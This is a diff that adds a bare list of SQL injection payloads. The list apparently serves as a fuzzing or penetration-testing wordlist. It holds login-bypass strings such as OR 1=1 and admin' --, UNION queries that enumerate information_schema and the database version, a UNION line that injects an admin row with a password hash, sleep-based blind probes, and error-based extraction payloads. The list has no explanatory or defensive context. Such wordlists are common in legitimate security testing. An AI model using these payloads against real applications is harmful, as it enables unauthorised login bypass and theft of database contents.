@@ -1,0 +1,21 @@
+' OR 1=1 --
+' OR '1'='1
+" OR 1=1 --
+" OR "1"="1
+' OR 1=1#
+') OR ('1'='1
+') OR ('1'='1'--
+' UNION SELECT NULL, NULL#
+' UNION SELECT NULL, NULL, NULL#
+' UNION SELECT @@version, NULL#
+' UNION ALL SELECT * FROM information_schema.tables#
+admin' --
+admin' #
+admin' OR '1'='1
+' OR 1=1 LIMIT 1;#
+" OR 1=1 LIMIT 1;#
+' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
+' AND sleep(5) --
+" AND sleep(5) --
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+1' AND (SELECT 2 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
